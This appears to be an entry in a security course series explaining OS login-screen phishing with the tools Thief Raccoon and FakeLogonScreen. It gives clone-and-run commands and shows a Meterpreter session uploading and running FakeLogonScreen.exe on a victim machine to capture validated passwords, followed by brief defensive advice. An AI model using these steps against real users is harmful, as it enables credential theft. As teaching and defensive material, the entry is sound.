# Day 29 — OS Login Phishing

## 🎯 Goal
Learn how attackers create **fake OS login screens** to harvest a victim's local account password, using `Thief Raccoon` and `FakeLogonScreen`.

---

## 📖 Concept
Unlike web-based phishing, **OS login phishing** shows the victim a screen that looks exactly like their native login prompt (Windows lock screen, macOS login, Ubuntu greeter). The victim — thinking their session just locked — types their real password, which is captured and (often) validated against the real system to avoid suspicion.

---

## 🛠️ Tool 1: Thief Raccoon

```bash
git clone https://github.com/davenisc/thief_raccoon
cd thief_raccoon
python app.py
```
- Purpose: **educational** demonstration of how phishing attacks can be conducted across various OSes.
- Author: `@davenisc`

### Supported OS targets
```
Seleccione el sistema operativo para el phishing:
1. Windows 10
2. Windows 11
3. Windows XP
4. Windows Server
5. Ubuntu
6. Ubuntu Server
7. macOS
```
- Serves a convincing fake lock/login screen matching the chosen OS.
- Captured credentials saved locally (`credentials.txt`).
- 150+ GitHub stars, MIT licensed.

---

## 🛠️ Tool 2: FakeLogonScreen

```
GitHub: bitsadmin/fakelogonscreen (1.3k stars, BSD-3-Clause license)
```
> "FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain the user's password. The password entered is **validated against Active Directory or the local machine** to make sure it's correct, then displayed to the console or saved to disk."

Two binaries:
- `FakeLogonScreen.exe` → outputs captured password to console (Cobalt Strike compatible via `execute-assembly`)
- `FakeLogonScreenToFile.exe` → also saves to `%LOCALAPPDATA%\Microsoft\user.db`

### Delivery via Meterpreter
```
meterpreter > pwd
C:\Users\Tony Stark\Downloads
meterpreter > upload ~/Downloads/fakelogonscreen_trunk/FakeLogonScreen.exe
[*] Uploading  : FakeLogonScreen.exe → 27.50 KiB (100.0%)
[*] Completed  : FakeLogonScreen.exe
```
Then execute it on the target (via `execute -f FakeLogonScreen.exe` or manually) — victim sees a perfectly convincing Windows 10 lock screen. Password entered is validated, then attacker retrieves it.

### Features
- Shows fake Windows 10 login screen; extra monitors turn black to sell the illusion.
- If a custom desktop background is configured, it mimics that instead of the default.
- Validates entered password before closing the screen (so the victim doesn't get suspicious).
- Outputs to console or stores in a file.

---

## ✅ Key Takeaways
- OS login phishing is highly effective because it exploits the **muscle memory** of typing a password at a familiar-looking prompt.
- Password **validation against the real credential store** (AD/local SAM) is the key trick — it means the fake screen behaves indistinguishably from the real one (wrong password → error, correct → screen dismisses).
- Defense: enable screen-lock timeouts tied to trusted OS mechanisms only, use hardware security keys / biometrics where possible to reduce password-only reliance, and monitor for unauthorized `.exe` uploads/execution via EDR.
